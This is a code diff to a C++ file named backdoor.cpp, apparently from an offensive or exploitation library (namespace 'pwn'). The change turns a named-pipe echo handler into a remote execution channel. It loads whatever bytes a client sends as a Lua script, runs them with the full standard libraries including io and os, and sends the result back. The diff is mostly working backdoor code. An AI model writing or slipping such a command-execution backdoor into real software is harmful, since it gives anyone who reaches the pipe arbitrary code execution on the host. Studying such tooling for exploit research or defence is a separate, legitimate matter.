@@ -1,5 +1,11 @@
 #include "backdoor.hpp"
 
+EXTERN_C_START
+#include <lauxlib.h>
+#include <lua.h>
+#include <lualib.h>
+EXTERN_C_END
+
 #include <mutex>
 
 #include "handle.hpp"
@@ -7,6 +13,9 @@
 #include "utils.hpp"
 
 using namespace pwn::utils;
+
+/* the Lua interpreter */
+static lua_State* L;
 
 namespace pwn::backdoor
 {
@@ -171,29 +180,88 @@ HandleClientThread(const LPVOID lpThreadParams)
         }
 
         //
-        // Parse and execute the command
+        // Input read is done, process the command and send back the result
         //
         if ( cfg->State == ThreadState::ReadFinished )
         {
-            // for now just ping back
-            cfg->response_size = cfg->request_size;
-            cfg->response      = std::make_unique<u8[]>(cfg->response_size);
-            ::RtlCopyMemory(cfg->response.get(), cfg->request.get(), cfg->response_size);
+            cfg->command_number++;
 
-            DWORD dwNumberOfByteRead;
-
-            // todo: for now, it's ok to make write blocking
-            const bool bRes =
-                ::WriteFile(hPipe.get(), cfg->response.get(), cfg->response_size, &dwNumberOfByteRead, nullptr);
-
-            if ( bRes == false )
+            std::string response = "";
+            // Execute the Lua command(s)
             {
-                pwn::log::perror(L"WriteFile()");
-                cfg->SetState(ThreadState::Stopping);
+                const usize initial_stack_size = lua_gettop(L);
+                const std::string name         = std::format("backdoor-command-{}", cfg->command_number);
+                auto LuaRc = luaL_loadbuffer(L, (const char*)cfg->request.get(), cfg->request_size, name.c_str());
+                if ( LuaRc )
+                {
+                    response = lua_tostring(L, -1);
+                    lua_pop(L, 1);
+                }
+                else
+                {
+                    lua_pcall(L, 0, LUA_MULTRET, 0);
+                    const usize new_stack_size = lua_gettop(L);
+
+                    // Check for returned values
+                    const usize nb_retvalues = (new_stack_size - initial_stack_size);
+                    switch ( nb_retvalues )
+                    {
+                    case 0:
+                        break;
+                    case 1:
+                    {
+                        switch ( lua_type(L, -1) )
+                        {
+                        case LUA_TNIL:
+                            response = "(nil)";
+                            break;
+
+                        case LUA_TBOOLEAN:
+                            response = (lua_toboolean(L, -1) == 1) ? "true" : "false";
+                            break;
+
+                        case LUA_TSTRING:
+                            response = lua_tostring(L, -1);
+                            break;
+
+                        case LUA_TNUMBER:
+                            response = std::to_string(lua_tonumber(L, -1));
+                            break;
+                        }
+                        lua_pop(L, 1);
+                        break;
+                    }
+                    default:
+                        response = std::format("{} values returned by call, this is not handled (yet)", nb_retvalues);
+                        break;
+                    }
+                }
             }
-            else
+
+            // Build the response message
             {
-                cfg->SetState(ThreadState::ReadyToRead);
+                cfg->response_size = response.size();
+                cfg->response      = std::make_unique<u8[]>(cfg->response_size);
+                ::RtlCopyMemory(cfg->response.get(), response.c_str(), cfg->response_size);
+            }
+
+            // Send it
+            {
+                DWORD dwNumberOfByteRead;
+
+                // TODO: for now, it's ok to make write blocking
+                const bool bRes =
+                    ::WriteFile(hPipe.get(), cfg->response.get(), cfg->response_size, &dwNumberOfByteRead, nullptr);
+
+                if ( bRes == false )
+                {
+                    pwn::log::perror(L"WriteFile()");
+                    cfg->SetState(ThreadState::Stopping);
+                }
+                else
+                {
+                    cfg->SetState(ThreadState::ReadyToRead);
+                }
             }
             continue;
         }
@@ -312,11 +380,42 @@ AllowNextClient() -> Result<bool>
     return Err(ErrorType::Code::GenericError);
 }
 
+
+void
+InitializeLuaVm()
+{
+    //
+    // Initialize the VM
+    //
+    L = luaL_newstate();
+
+    //
+    // Load some basic modules
+    //
+#if LUA_VERSION_NUM >= 501
+    luaL_openlibs(L);
+#else
+    luaopen_base(L);
+    luaopen_table(L);
+    luaopen_io(L);
+    luaopen_string(L);
+    luaopen_math(L);
+#endif
+}
+
+
+void
+TerminateLuaVm()
+{
+    lua_close(L);
+}
+
 } // namespace
 
 auto
 start() -> Result<bool>
 {
+    InitializeLuaVm();
     globals.m_backdoor_thread = std::jthread::jthread(
         []
         {
@@ -346,6 +445,7 @@ stop() -> Result<bool>
 
     ::WaitForMultipleObjects(sz, handles.data(), true, INFINITE);
 
+    TerminateLuaVm();
     return Ok(true);
 }
 
